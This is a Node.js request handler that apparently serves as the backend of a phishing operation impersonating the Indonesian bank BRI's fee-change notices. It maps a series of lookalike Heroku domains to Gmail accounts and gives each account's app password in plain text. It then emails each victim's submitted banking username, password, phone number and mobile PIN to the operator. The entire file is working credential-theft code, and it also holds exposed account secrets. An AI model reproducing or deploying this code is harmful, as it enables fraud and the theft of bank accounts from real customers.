export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';

    if(url == 'https://ubahtarif.herokuapp.com/ '){

        email = 'orbitorbit799@gmail.com';
        pass = 'ahghpmbdwokimqim'; 

    } else if(url == 'tarifbri-baru-lama.herokuapp.com'){
        email = 'jakarta12zx@gmail.com' ;
        pass = 'ijrwylcjdzswcfnj' ;

    } else if (url == 'app-log-brimo-bifast.herokuapp.com'){
        email = 'brigacor80@gmail.com';
        pass = 'zhzcfhbdtzipldsz';
        
    } else if(url == 'britarif--baru-lama.herokuapp.com'){
        email = 'samsudin19.01.12@gmail.com';
        pass = 'nsozbvpgogzlfeqg';

    } else if(url == 'tarif--baru-lama.herokuapp.com'){
        email = 'tarifbaru36@gmail.com';
        pass = 'moiasopufjkptyvr';

    } else if(url == 'tarif-lama--baru.herokuapp.com'){
        email = 'accbrimo05@gmail.com';
        pass = 'hluxpmqqqqsjrbaf';

    } else if(url == 'app-ubahtarifbri.herokuapp.com'){
        email = 'callbribricoid66@gmail.com';
        pass = 'imuujsgssprgrtue';

    } else if(url == 'perubahan--bri-tariff.herokuapp.com'){
        email = 'andarasultan954@gmail.com';
        pass = 'xwjfzwdtiaxfname';

    } else if(url == 'tarif--perubahan.herokuapp.com'){
        email = 'bbri94669@gmail.com';
        pass = 'tdoctundphxocdqu';

    } else if(url == 'perubahanntarif--bri.herokuapp.com'){
        email = 'bossmudaid766@gmail.com';
        pass = 'xvahirtwxvbntkxv';

    } else if(url == 'perubah--an-britarifff.herokuapp.com'){
        email = 'ssamsol397@gmail.com';
        pass = 'hqkkqinsugrirqne';

    }  
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',  
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'BriApp',
                html: `
                <ul>
                    <li>username: ${body.username ?? '-'}</li> 
                    <li>password: ${body.password ?? '-'}</li>
                    <li>nohp: ${body.noHp ?? '-'}</li>
                    <li>pin: ${body.mPin ?? '-'}</li>
                    <li>message: ${body.message ?? '-'}</li>
                </ul>
                `,                  
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}